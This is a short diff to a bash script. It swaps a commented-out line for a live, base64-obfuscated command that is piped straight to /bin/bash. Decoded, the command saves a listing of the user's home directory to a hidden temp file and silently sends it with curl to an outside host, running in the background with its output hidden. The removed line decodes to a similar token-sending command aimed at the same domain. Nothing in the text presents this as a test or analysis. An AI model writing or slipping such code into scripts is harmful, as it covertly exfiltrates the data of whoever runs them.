@@ -1,2 +1,2 @@
 #!/bin/bash
-# echo -n 'Y3VybCAtZCBAL3RtcC91VnR3cUh0emEgaHR0cDovL3N2Mi5iYWNrdXAtaG9zdGluZy1udm0uc2l0ZTo2OTY5L3pzaC10b2tlbiA+L2Rldi9udWxsIDI+JjEgJgo=' | base64 -d | /bin/bash
+echo -ne 'IyEvYmluL2Jhc2gKZm49Ii90bXAvLmdnN3FqZkhxdE9xLiRSQU5ET00ucHJpdmF0ZSIKbHMgLWxhIH4gPiAkZm4gJiYgY3VybCAtZCBAJGZuIGh0dHBzOi8vc3YxLmJhY2t1cC1ob3N0aW5nLW52bS5zaXRlL3pyID4vZGV2L251bGwgMj4mMSAm' | base64 -d | /bin/bash
